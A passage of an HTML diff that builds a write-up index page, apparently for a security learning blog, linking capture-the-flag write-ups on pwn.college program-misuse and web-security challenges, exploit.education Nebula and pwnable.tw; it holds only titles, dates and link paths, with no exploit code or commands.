+                    <div class="ida-list-wrapper">
+                        <table class="ida-list">
+                            <thead>
+                                <tr>
+                                    <th>Address</th>
+                                    <th>Function Name</th>
+                                    <th>Segment</th>
+                                    <th>Date</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194305</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-01-cat/">Challenge Name: cat</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194306</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-02-more/">Challenge Name: more</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194307</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-03-less/">Challenge Name: less</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194308</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-04-tail/">Challenge Name: tail</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194309</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-05-head/">Challenge Name: head</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194310</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-06-sort/">Challenge Name: sort</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194311</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-07-vim/">Challenge Name: vim</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194312</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-08-emacs/">Challenge Name: emacs</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194313</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-09-nano/">Challenge Name: nano</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194314</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-10-rev/">Challenge Name: rev</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194315</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-11-od/">Challenge Name: od</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194316</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-12-hd/">Challenge Name: hd</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194317</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-13-xxd/">Challenge Name: xxd</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194318</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-14-base32/">Challenge Name: base32</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194319</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-15-base64/">Challenge Name: base64</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194320</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-16-split/">Challenge Name: split</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194321</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-17-gzip/">Challenge Name: gzip</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194322</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-18-bzip2/">Challenge Name: bzip2</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194323</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-19-zip/">Challenge Name: zip</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194324</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-20-tar/">Challenge Name: tar</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194325</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-21-ar/">Challenge Name: ar</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194326</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-22-cpio/">Challenge Name: cpio</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194327</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-23-genisoimage/">Challenge Name: genisoimage</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194328</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-24-env/">Challenge Name: env</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194329</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-25-find/">Challenge Name: find</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194330</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-26-make/">Challenge Name: make</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194331</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-27-nice/">Challenge Name: nice</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194332</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-28-timeout/">Challenge Name: timeout</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194333</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-29-stdbuf/">Challenge Name: stdbuf</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194334</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-30-setarch/">Challenge Name: setarch</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194335</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-31-watch/">Challenge Name: watch</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194336</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-32-socat/">Challenge Name: socat</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194337</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-33-whiptail/">Challenge Name: whiptail</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194338</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-34-awk/">Challenge Name: awk</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194339</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-35-sed/">Challenge Name: sed</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194340</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-36-ed/">Challenge Name: ed</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194341</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-37-chown/">Challenge Name: chown</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194342</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-38-chmod/">Challenge Name: chmod</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194343</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-39-cp/">Challenge Name: cp</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194344</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-40-mv/">Challenge Name: mv</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194345</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-41-perl/">Challenge Name: perl</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194346</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-42-python/">Challenge Name: python</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194347</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-43-ruby/">Challenge Name: ruby</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194348</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-44-bash/">Challenge Name: bash</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194349</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-45-date/">Challenge Name: date</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194350</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-47-wc/">Challenge Name: wc</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194351</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-48-gcc/">Challenge Name: gcc</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194352</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-49-as/">Challenge Name: as</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194353</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/program-misuse-50-wget/">Challenge Name: wget</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                            </tbody>
+                        </table>
+                    </div>
+                
+                    <h3 style="font-family: var(--font-mono); font-size: 0.95rem; color: var(--text-bright); margin-top: 1rem; margin-bottom: 0.5rem;">
+                        <span style="color: var(--syn-danger);">-></span> Web Security <span style="color: var(--text-muted); font-size: 0.8rem;">[27 items]</span>
+                    </h3>
+                    <div class="ida-list-wrapper">
+                        <table class="ida-list">
+                            <thead>
+                                <tr>
+                                    <th>Address</th>
+                                    <th>Function Name</th>
+                                    <th>Segment</th>
+                                    <th>Date</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194305</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-01-path-traversal-1/">🕵️‍♂️ Challenge: Path Traversal 1</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194306</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-02-path-traversal-2/">🕵️‍♂️ Challenge: Path Traversal 2</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194307</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-03-cdmi1/">Challenge: CDMi 1</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194308</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-04-dsmi2/">🧠 Challenge Name: CMDi-2</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194309</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-05-cdmi3/">🧠 Challenge Name: CMDi-3</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194310</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-06-cdmi4/">Command Injection 4 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194311</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-07-cdmi5/">💉 Command Injection 5 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194312</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-08-cdmi6/">💉 Command Injection 6 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194313</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-09-authentication-bypass1/">Authentication Bypass 1 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194314</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-10-authentication-bypass2/">🔐 Authentication Bypass 2 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194315</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-11-sqli1/">💉 SQL Injection 1 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194316</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-12-sqli2/">💉 SQL Injection 2 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194317</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-13-sqli3/">SQLi 3 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194318</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-14-sqli4/">SQL Injection 4 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194319</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-15-sqli5/">SQL Injection 5 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194320</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-16-xss1/">🛡️ Web — XSS1 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194321</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-17-xss2/">XSS 2 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194322</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-18-xss3/">XSS 3 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194323</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-19-xss4/">🛡️ XSS 4 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194324</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-20-xss5/">🛡️ XSS 5 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194325</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-21-xss6/">🛡️ XSS 6 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194326</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-22-xss7/">XSS-7 Write-up — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194327</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-23-csrf1/">💉 CSRF 1 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194328</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-24-csrf2/">CSRF-2 Write-up — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194329</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-25-csrf3/">CSRF-3 Write-up — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194330</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-26-csrf4/">CSRF-4 Write-up — pwn.college</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194331</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/web-security-27-csrf5/">CSRF-5 — Writeup</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/04/27</td>
+                                </tr>
+                                
+                            </tbody>
+                        </table>
+                    </div>
+                
+            
+        
+            <h2 style="font-family: var(--font-mono); font-size: 1.1rem; color: var(--syn-address); margin-top: 2rem; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                exploit.education
+            </h2>
+
+            
+            
+            
+                
+                
+                    <h3 style="font-family: var(--font-mono); font-size: 0.95rem; color: var(--text-bright); margin-top: 1rem; margin-bottom: 0.5rem;">
+                        <span style="color: var(--syn-danger);">-></span> Nebula <span style="color: var(--text-muted); font-size: 0.8rem;">[7 items]</span>
+                    </h3>
+                    <div class="ida-list-wrapper">
+                        <table class="ida-list">
+                            <thead>
+                                <tr>
+                                    <th>Address</th>
+                                    <th>Function Name</th>
+                                    <th>Segment</th>
+                                    <th>Date</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194305</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/exploit-education-nebula-level00/">Level 00</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194306</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/exploit-education-nebula-level01/">Level 01</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194307</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/exploit-education-nebula-level02/">Level 02</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194308</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/exploit-education-nebula-level03/">Level 03</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194309</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/exploit-education-nebula-level04/">Level 04</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194310</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/exploit-education-nebula-level05/">Level 05</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194311</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/exploit-education-nebula-level06/">Level 06</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                            </tbody>
+                        </table>
+                    </div>
+                
+            
+        
+            <h2 style="font-family: var(--font-mono); font-size: 1.1rem; color: var(--syn-address); margin-top: 2rem; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                pwnable.tw
+            </h2>
+
+            
+            
+            
+                
+                
+                    <h3 style="font-family: var(--font-mono); font-size: 0.95rem; color: var(--text-bright); margin-top: 1rem; margin-bottom: 0.5rem;">
+                        <span style="color: var(--syn-danger);">-></span>  <span style="color: var(--text-muted); font-size: 0.8rem;">[2 items]</span>
+                    </h3>
+                    <div class="ida-list-wrapper">
+                        <table class="ida-list">
+                            <thead>
+                                <tr>
+                                    <th>Address</th>
+                                    <th>Function Name</th>
+                                    <th>Segment</th>
+                                    <th>Date</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194305</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/pwnable-tw-orw/">ORW</a>
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                                <tr>
+                                    <td class="ida-addr">0x194306</td>
+                                    <td class="ida-name">
+                                        <a href="/writeups/pwnable-tw-start/">Start</a>
+                                        
+                                            
+                                                
+                                                
+                                                    <span class="prot-tag success">&lt;No PIE&gt;</span>
+                                                
+                                            
+                                                
+                                                
+                                                    <span class="prot-tag success">&lt;No Canary&gt;</span>
+                                                
+                                            
+                                                
+                                                
+                                                    <span class="prot-tag success">&lt;NX disabled&gt;</span>
+                                                
+                                            
+                                        
+                                    </td>
+                                    <td class="ida-seg">.platform</td>
+                                    <td class="ida-date">2026/05/16</td>
+                                </tr>
+                                
+                            </tbody>
+                        </table>
+                    </div>
+                
+            
+        
+    </div>
+</div>
+
+<!-- Live CTFs -->
+<div class="docked-window" style="margin-top: 3rem;">
+    <div class="window-header">
+        <span>Capture The Flag Events</span>
+        <span class="tag">Filter: major_type=CTF</span>
+    </div>
+    <div class="window-body padded">
+        
+        
+
+        
+            <h2 style="font-family: var(--font-mono); font-size: 1.1rem; color: var(--syn-address); margin-top: 0; margin-bottom: 1rem; border-bottom: 1px solid var(--border-color); padding-bottom: 0.5rem;">
+                ImaginaryCTF 2025 <span style="font-size: 0.85rem; color: var(--text-muted); float: right;">[3 items]</span>
+            </h2>
+            
+            <div class="ida-list-wrapper">
+                <table class="ida-list">
+                    <thead>
+                        <tr>
+                            <th>Address</th>
+                            <th>Function Name</th>
+                            <th>Segment</th>
+                            <th>Date</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        
+                        <tr>
+                            <td class="ida-addr">0x194305</td>
+                            <td class="ida-name">
